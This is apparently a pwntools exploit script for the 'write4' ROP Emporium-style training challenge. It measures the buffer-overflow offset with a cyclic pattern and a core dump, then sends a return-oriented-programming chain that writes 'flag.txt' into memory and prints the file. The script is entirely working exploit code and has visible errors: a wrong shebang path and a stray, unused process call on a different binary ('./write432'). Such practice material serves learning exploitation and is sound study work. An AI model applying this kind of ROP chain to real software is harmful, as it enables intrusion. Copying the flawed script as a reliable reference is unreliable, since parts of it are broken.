#!/bin/usr/python3
from pwn import *

def start():
	p = process("./write4")
	gdb.attach(p, gdbscript = '''
		b main
		continue
	''')
	return p

elf = context.binary = ELF("./write4")
context.log_level = "info"
context.delete_corefiles = True

data_section = elf.symbols.data_start
mov_gadget = elf.symbols.usefulGadgets

rop = ROP(elf)
pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
rop.raw([pop_r14_r15, data_section, "flag.txt", mov_gadget])
rop.print_file(data_section)
rop_chain = rop.chain()

p = process("./write432")

io = start()
payload = cyclic(100)
io.sendlineafter(">", payload)
io.wait()
core = io.corefile

rsp = core.rsp
pattern = core.read(rsp, 4)
rip_offset = cyclic_find(pattern)
info("rip_offset = %#x", rip_offset)

io = start()
payload = flat(
	asm('nop') * rip_offset,
	rop_chain
)

io.sendlineafter(">", payload)
while True:
	tmp = io.recv()
	info(tmp)








